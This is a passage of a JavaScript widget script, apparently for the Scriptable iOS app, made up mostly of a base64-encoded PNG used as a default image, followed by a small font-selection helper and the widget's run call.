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';
    let imageData = Data.fromBase64String(defaultImage);
    return Image.fromData(imageData);
  }

  getFont(fontName, fontSize) {
    if (fontName == 'SF UI Display') {
      return Font.systemFont(fontSize);
    }
    if (fontName == 'SF UI Display Bold') {
      return Font.semiboldSystemFont(fontSize);
    }
    return new Font(fontName, fontSize);
  }
}

await Running(Widget);
